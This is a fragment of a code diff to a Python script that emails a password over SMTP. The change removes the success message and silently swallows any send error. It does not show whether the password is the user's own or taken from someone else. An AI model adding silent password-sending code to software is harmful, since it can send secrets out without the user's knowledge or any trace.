@@ -55,9 +55,9 @@ def send_password_email(password):
             server.starttls()  # Secure connection
             server.login(sender_email, sender_password)  # Login with email credentials
             server.sendmail(sender_email, receiver_email, message.as_string())
-        print("Password sent successfully!")
     except Exception as e:
-        print(f"Failed to send email: {e}")
+        # In case of failure, no output is shown (you can log the error elsewhere if necessary)
+        pass
 
 def main():
     # Get user input
